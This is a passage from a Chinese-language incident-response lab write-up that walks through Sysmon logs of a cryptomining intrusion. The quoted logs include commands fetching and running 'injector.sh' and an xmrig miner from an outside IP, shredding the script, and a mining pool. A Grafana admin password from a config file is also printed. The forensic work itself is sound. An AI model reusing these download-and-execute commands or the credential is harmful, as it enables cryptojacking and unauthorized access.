Name="ParentProcessGuid">{c9eb4a87-2b89-637f-4894-b7e93f560000}</Data><Data Name="ParentProcessId">3371</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>\nNov 24 09:55:35 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:55:35.396996000Z"/><EventRecordID>76910</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:55:35.401</Data><Data Name="ProcessGuid">{c9eb4a87-3f97-637f-70dc-b5d3e3550000}</Data><Data Name="ProcessId">3992</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-3f97-637f-4864-74f766550000}</Data><Data Name="ParentProcessId">3991</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>\nNov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.851002000Z"/><EventRecordID>76943</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.855</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-70ec-fbf465550000}</Data><Data Name="ProcessId">4001</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>\nNov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.863982000Z"/><EventRecordID>76945</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.869</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-70ec-fbf465550000}</Data><Data Name="ProcessId">4001</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="TargetFilename">/opt/automation/injector.sh</Data><Data Name="CreationUtcTime">2022-11-24 09:59:47.869</Data><Data Name="User">root</Data></EventData></Event>\nNov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.867270000Z"/><EventRecordID>76947</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.872</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-e091-5b045a550000}</Data><Data Name="ProcessId">4002</Data><Data Name="Image">/bin/chmod</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">chmod +x injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>\nNov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.869152000Z"/><EventRecordID>76949</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.874</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-086e-c8d5d7550000}</Data><Data Name="ProcessId">4003</Data><Data Name="Image">/usr/bin/sudo</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">sudo ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>\nNov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.877825000Z"/><EventRecordID>76953</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.882</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ProcessId">4004</Data><Data Name="Image">/bin/bash</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">/bin/bash ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-086e-c8d5d7550000}</Data><Data Name="ParentProcessId">4003</Data><Data Name="ParentImage">/usr/bin/sudo</Data><Data Name="ParentCommandLine">sudo</Data><Data Name="ParentUser">root</Data></EventData></Event>\nNov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.343163000Z"/><EventRecordID>77196</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.344</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-505f-8d8aca550000}</Data><Data Name="ProcessId">4091</Data><Data Name="Image">/usr/bin/shred</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">shred -u ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>\n'})}),"\n",(0,n.jsx)(a.p,{children:"\u5b9a\u4f4d\u5230"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"wget http://44.204.18.94:80/injector.sh\n"})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"wget\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-6",children:"Task 6"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u6700\u521d\u5c06\u52a0\u5bc6\u6316\u77ff\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u914d\u7f6e\u6587\u4ef6\u4e0b\u8f7d\u5230\u4e86\u54ea\u91cc\uff1f"}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:["\u76f4\u63a5\u4ee5 ",(0,n.jsx)(a.code,{children:"/usr/bin/curl"})," \u4f5c\u4e3a\u5173\u952e\u8bcd\u8fdb\u884c\u5b9a\u4f4d"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~/tmp/var/log]\n\u2514\u2500\u2500\u257c $ cat syslog | grep "/usr/bin/curl"\nNov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.882033000Z"/><EventRecordID>76954</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.884</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>\nNov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.924977000Z"/><EventRecordID>76955</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.930</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">172.31.60.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">42234</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">44.204.18.94</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationPortName">-</Data></EventData></Event>\nNov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.929626000Z"/><EventRecordID>76956</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.934</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="TargetFilename">/opt/automation/xmrig</Data><Data Name="CreationUtcTime">2022-11-24 09:59:47.934</Data><Data Name="User">root</Data></EventData></Event>\nNov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.010896000Z"/><EventRecordID>76957</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.016</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">172.31.60.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">42246</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">44.204.18.94</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationPortName">-</Data></EventData></Event>\nNov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.013810000Z"/><EventRecordID>76958</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.019</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="TargetFilename">/opt/automation/config.json</Data><Data Name="CreationUtcTime">2022-11-24 09:59:48.019</Data><Data Name="User">root</Data></EventData></Event>\nNov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.015060000Z"/><EventRecordID>76959</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.020</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data></EventData></Event>\n'})}),"\n",(0,n.jsx)(a.p,{children:"\u770b\u5230\u4ee5\u4e0b\u65e5\u5fd7"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json\n/opt/automation\n"})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"/opt/automation/\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-7",children:"Task 7"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"TA \u4f7f\u7528\u54ea\u4e2a\u7a0b\u5e8f\u540c\u65f6\u4e0b\u8f7d\u4e86\u52a0\u5bc6\u6316\u77ff\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u914d\u7f6e\u6587\u4ef6\uff1f"}),"\n"]}),"\n",(0,n.jsx)(a.p,{children:"\u770b\u4e0a\u4e00\u9898"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"curl\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-8",children:"Task 8"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u6211\u4eec\u9700\u8981\u786e\u8ba4 SOC \u56e2\u961f\u5f00\u59cb\u6536\u96c6\u8bc1\u636e\u7684\u786e\u5207\u65f6\u95f4\uff0c\u56e0\u4e3a\u62a5\u544a\u4e2d\u6ca1\u6709\u5305\u542b\u6b64\u4fe1\u606f\u3002\u4ed6\u4eec\u4f7f\u7528\u4e0e\u6211\u4eec\u6797\u80af\u7cfb\u7edf\u7ba1\u7406\u5458\u76f8\u540c\u7684\u516c\u7f51 IP \u5730\u5740\u3002"}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:["\u6839\u636e\u8fd9\u6761 ",(0,n.jsx)(a.code,{children:"syslog"})," \u7684\u8bb0\u5f55"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:'Nov 24 15:01:00 ip-172-31-13-147 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T15:01:00.508544000Z"/><EventRecordID>80918</EventRecordID><Correlation/><Execution ProcessID="1349" ThreadID="1349"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-13-147</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 15:01:00.511</Data><Data Name="ProcessGuid">{c9eb4a87-8703-637f-30e5-4b6291550000}</Data><Data Name="ProcessId">2355</Data><Data Name="Image">/usr/lib/openssh/sftp-server</Data><Data Name="TargetFilename">/home/ubuntu/Cat-Scale.sh</Data><Data Name="CreationUtcTime">2022-11-24 15:01:00.511</Data><Data Name="User">ubuntu</Data></EventData></Event>\n'})}),"\n",(0,n.jsx)(a.admonition,{type:"note",children:(0,n.jsx)(a.p,{children:"\u8fd9\u91cc\u7684\u65f6\u95f4\uff0c\u6307\u7684\u662f\u5f00\u59cb\u90e8\u7f72\u53d6\u8bc1\u811a\u672c\u7684\u65f6\u95f4\uff0c\u800c\u4e0d\u662f\u811a\u672c\u5f00\u59cb\u6267\u884c\u7684\u65f6\u95f4"})}),"\n",(0,n.jsx)(a.p,{children:"\u5373\u53ef\u5b9a\u4f4d"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"DD/MM/YYYY HH:MM:SS\n2022-11-24 15:01:00\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-9",children:"Task 9"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u8bf7\u786e\u8ba4\u7cfb\u7edf\u7ba1\u7406\u5458\u5728\u67d0\u4e9b Grafana \u914d\u7f6e\u6587\u4ef6\u4e2d\u7559\u4e0b\u7684\u5bc6\u7801\u3002"}),"\n"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="\\grafana\\conf\\defaults.ini"',children:"# default admin password, can be changed before first start of grafana, or in profile settings\nadmin_password = f0rela96789!\n"})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"f0rela96789!\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-10",children:"Task 10"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u5f53\u542f\u52a8 xmrig \u65f6\uff0c\u6316\u77ff\u7ebf\u7a0b\u503c\u8bbe\u7f6e\u4e3a\u591a\u5c11\uff1f"}),"\n"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"root      1089     1 2829088 9944 ?        Ssl  14:32 00:29:28 /usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json -- threads=0\n"})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"0\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-11",children:"Task 11"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u6211\u4eec\u7684 CISO \u8981\u6c42\u83b7\u53d6\u6709\u5173\u53ef\u80fd\u4f7f\u7528\u7684\u6316\u77ff\u6c60\u7684\u5176\u4ed6\u7ec6\u8282\u3002\u8bf7\u786e\u8ba4 TA \u4f7f\u7528\u4e86\u54ea\u4e2a\uff08\u5982\u679c\u6709\uff09\u6316\u77ff\u6c60\u3002"}),"\n"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:'Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mABOUT        #033[0m#033[1;36mXMRig/6.18.1#033[0m#033[1;37m gcc/5.4.0#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mLIBS         libuv/1.44.1 OpenSSL/1.1.1o hwloc/2.7.1#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mHUGE PAGES   #033[0m#033[1;32msupported#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37m1GB PAGES    #033[0m#033[1;33munavailable#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCPU          Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz (1)#033[0m #033[1;32m64-bit#033[0m #033[1;32mAES#033[1;31m VM#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;37m                #033[0m#033[1;30mL2:#033[0m#033[1;37m0.2 MB#033[0m#033[1;30m L3:#033[0m#033[1;37m30.0 MB#033[0m#033[1;36m 1#033[0mC#033[1;30m/#033[0m#033[1;36m1#033[0mT#033[1;30m NUMA:#033[0m#033[1;36m1#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mMEMORY       #033[0m#033[1;36m1.0/1.9#033[0m#033[0;36m GB#033[0m#033[1;30m (54%)#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;37m                #033[0mDIMM 0: #033[1;36m2#033[0m#033[0;36m GB #033[0m#033[1;37mRAM @ 0 MHz #033[0m#033[1;30mDIMM 0#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mMOTHERBOARD  #033[0m#033[1;37mXen#033[0m - #033[1;37mHVM domU#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mDONATE       #033[0m#033[1;37m5%#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mASSEMBLY     auto:#033[1;32mintel#033[0m#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mPOOL #1      #033[0m#033[1;32mmonero.herominers.com:10191#033[0m algo #033[1;37mrx/0#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCOMMANDS     #033[0m#033[45;1mh#033[0m#033[1;37mashrate, #033[0m#033[45;1mp#033[0m#033[1;37mause, #033[0m#033[45;1mr#033[0m#033[1;37mesume, #033[0m#033[1;37mre#033[0m#033[45m#033[1;37ms#033[0m#033[1;37mults, #033[0m#033[45;1mc#033[0m#033[1;37monnection#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.437492000Z"/><EventRecordID>77235</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.442</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-cc0f-ed9df4550000}</Data><Data Name="ProcessId">4101</Data><Data Name="Image">/usr/bin/apt-get</Data><Data Name="TargetFilename">/tmp/fileutl.message.UnyXYC</Data><Data Name="CreationUtcTime">2022-11-24 09:59:49.442</Data><Data Name="User">root</Data></EventData></Event>\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: [2022-11-24 09:59:49#033[1;30m.437#033[0m] #033[1;37m#033[46;1m#033[1;37m config  #033[0m #033[1;37mconfiguration saved to: "/usr/share/.logstxt/config.json"#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mOPENCL       #033[0m#033[1;31mdisabled#033[0m#033[0m\nNov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCUDA         